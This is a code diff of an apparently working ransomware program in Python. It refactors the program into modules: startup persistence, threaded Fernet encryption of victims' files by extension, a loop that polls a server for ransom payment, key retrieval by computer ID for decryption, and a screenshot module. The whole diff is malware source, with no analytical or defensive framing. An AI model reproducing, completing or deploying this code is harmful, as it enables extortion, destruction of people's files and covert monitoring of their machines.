@@ -1,9 +1,11 @@
 #  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com
 
 """System modules"""
+import array
 import sys
 import os
 import threading
+from concurrent.futures.thread import ThreadPoolExecutor
 
 from wcmatch import glob
 
@@ -40,14 +42,24 @@ from modules.internet.patch_ressources import patch_last_message_date
 TRUE_ALIASES = [True, "True", "true", "yes"]
 
 
-def get_all_files_in_directory(path):
+def get_all_files_in_directory(paths: array, onlyFileEncrypted: bool):
     """
     This function return all files and sub_files in a directory passed in param
     1) Use Glob to get all the file and return them in array shape
-    :param path: the start path
+    :param onlyFileEncrypted: want only file decrypted or only crypted ?
+    :param paths: array of path to encrypt file
     """
-    return [f for f in glob.glob(path + '/**/*.{' + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}',
-                                 flags=glob.BRACE | glob.GLOBSTAR) if isfile(f)]
+    files = []
+    pattern = '/**/[!gAAAAA]*.{'
+
+    if onlyFileEncrypted:
+        pattern = '/**/[gAAAAA]*.{'
+
+    for path in paths:
+        for f in glob.glob(path + pattern + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}', flags=glob.BRACE | glob.GLOBSTAR):
+            if isfile(f):
+                files.append(f)
+    return files
 
 
 def main():
@@ -55,33 +67,9 @@ def main():
     This function is the main function
     """
     is_connected = False
-    key = ""
-    # -- STARTUP MODULE --
-    startup_exec()
-    # -- STARTUP MODULE --
-    if get_config_file_info("encrypted") not in TRUE_ALIASES:
-        print("-- START OF ENCRYPTION STEP --")
-        # -- ENCRYPT MODULE --
-        threads = []
 
-        key = Fernet.generate_key()
-
-        print("-- KEY GENERATED --")
-
-        fernet = Fernet(key)
-
-        files = get_all_files_in_directory("sandbox")
-
-        for file in files:
-            thread = threading.Thread(target=encrypt_file, args=(file, fernet,))
-            threads.append(thread)
-            thread.start()
-
-        for thread in threads:
-            thread.join()
-
-        print("-- END OF ENCRYPTION STEP --")
-        # -- ENCRYPT MODULE --
+    startup_module()
+    key = encrypt_module()
 
     # -- CHANGE BG MODULE --
     # change_background_image(getcwd() + "/" + get_image())
@@ -111,7 +99,26 @@ def main():
     has_paid_checker.join()
 
 
-# -- HAS PAID MODULE --
+def encrypt_module():
+    """
+    This module is used to encrypt data
+    """
+    key = ""
+    if get_config_file_info("encrypted") not in TRUE_ALIASES:
+        pool = ThreadPoolExecutor(max_workers=10)
+        computer_id = get_config_file_info("computer_id")
+        if computer_id:
+            key = get_the_decryption_key(computer_id).encode()
+        else:
+            key = Fernet.generate_key()
+        print("-- KEY GENERATED --")
+        files = get_all_files_in_directory(["sandbox"], False)
+        for file in files:
+            pool.submit(encrypt_file, file, Fernet(key))
+        pool.shutdown(wait=True)
+        edit_config_file("encrypted", "True")
+    return key
+
 
 def has_paid_checker_module(computer_id: str):
     """
@@ -126,29 +133,30 @@ def has_paid_checker_module(computer_id: str):
         try:
             print("-- HE HAS PAID : --" + str(get_has_paid(computer_id)))
             if get_has_paid(computer_id):
-                key = get_the_decryption_key(computer_id).encode()
-                files = get_all_files_in_directory("sandbox")
-                if key:
-                    threads = []
-                    for file in files:
-                        thread = threading.Thread(target=decrypt_file, args=(file, Fernet(key, )))
-                        threads.append(thread)
-                        thread.start()
-                    for thread in threads:
-                        thread.join()
-
-                    edit_config_file("has_paid", "True")
-                sys.exit(0)
+                edit_config_file("has_paid", "True")
+                decrypt_module(computer_id)
         except requests.ConnectionError:
             print("Wait for web server to respond . . .")
             time.sleep(10)
         time.sleep(float(os.getenv("DELAY_BETWEEN_HAS_PAID_CHECK")))
 
 
-# --  HAS PAID MODULE --
+def decrypt_module(computer_id):
+    """
+    module use to decrypt files
+    :param computer_id: ID of the computer
+    :return:
+    """
+    pool = ThreadPoolExecutor(max_workers=10)
+    key = get_the_decryption_key(computer_id).encode()
+    files = get_all_files_in_directory(["sandbox"], True)
+    if key:
+        for file in files:
+            pool.submit(decrypt_file, file, Fernet(key))
+        pool.shutdown(wait=True)
+        edit_config_file("decrypted", "True")
+    sys.exit(0)
 
-
-# -- SCREENSHOT MODULE --
 
 def screenshot_module(computer_id):
     """
@@ -171,11 +179,18 @@ def screenshot_module(computer_id):
             time.sleep(10)
 
 
-# -- SCREENSHOT MODULE --
+def startup_module():
+    """
+    This module is used launch the exe at the start of the computer
+    """
+    startup_exec()
 
 
 if __name__ == '__main__':
 
     if get_config_file_info("has_paid") in TRUE_ALIASES:
+        computer_id = get_config_file_info("computer_id")
+        if get_config_file_info("decrypted") not in TRUE_ALIASES and computer_id:
+            decrypt_module(computer_id)
         sys.exit(0)
-    asyncio.run(main())
+    main()
